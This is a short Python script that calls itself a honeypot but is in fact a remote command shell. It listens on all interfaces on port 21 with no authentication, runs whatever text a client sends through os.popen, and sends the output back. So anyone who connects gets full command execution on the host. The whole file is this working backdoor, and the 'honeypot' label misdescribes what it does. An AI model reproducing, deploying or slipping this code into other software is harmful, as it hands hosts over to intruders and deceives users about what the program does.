import socket,os
from encryption_op import MANUAL_ENCRYPTION as MAN_F

class COLOR_TYPE():
    END_COLOR = "\x1b[0m"
    GREEN_COLOR = "\033[1;32m"
    RED_COLOR = "\033[1;31m"
    YELLOW_COLOR = "\033[1;33m"
    INFO_COLOR = "\033[1;36m"
    
class ECHO_PRINT():
    def GREEN_ECHO(echo_att=str):
        return COLOR_TYPE.GREEN_COLOR+echo_att+COLOR_TYPE.END_COLOR
    def YELLOW_ECHO(echo_att=str):
        return COLOR_TYPE.YELLOW_COLOR+echo_att+COLOR_TYPE.END_COLOR
    def RED_ECHO(echo_att=str):
        return COLOR_TYPE.RED_COLOR+echo_att+COLOR_TYPE.END_COLOR
    def INFO_ECHO(echo_att=str):
        return COLOR_TYPE.INFO_COLOR+echo_att+COLOR_TYPE.END_COLOR
    
    
class CONNECTION_OPS():
    def GET_LOCAL_IP():
        my_host = socket.gethostname()
        my_ip = socket.gethostbyname(my_host)
        return my_ip
    
    def START_SERVER(lhost="0.0.0.0",
                     lport=21,
                     sfamily=socket.AF_INET,
                     sstream=socket.SOCK_STREAM,
                     clisten=2,
                     dsize=2048):
        sc_main = socket.socket(sfamily,sstream)
        sc_main.setblocking(1)
        sc_main.bind((lhost,lport))
        sc_main.listen(clisten)
        while True:
            try:
                (user_c,att_c) = sc_main.accept()
                user_c.send("HONEYPOT ACTIVE".encode())
                response_command = user_c.recv(dsize).decode()
                print("COMMAND: %s"%ECHO_PRINT.GREEN_ECHO(response_command))
                read_command = os.popen(response_command).read()
                user_c.send(read_command.encode())
            except:
                break
                
          
if __name__ == '__main__':
    try:
        ip_host = CONNECTION_OPS.GET_LOCAL_IP()
        # print(ip_host)
        print("\n")
        print("SERVER ACTIVE")
        print("\n")
        CONNECTION_OPS.START_SERVER()
    except Exception as err:
        print(str(err))
        pass
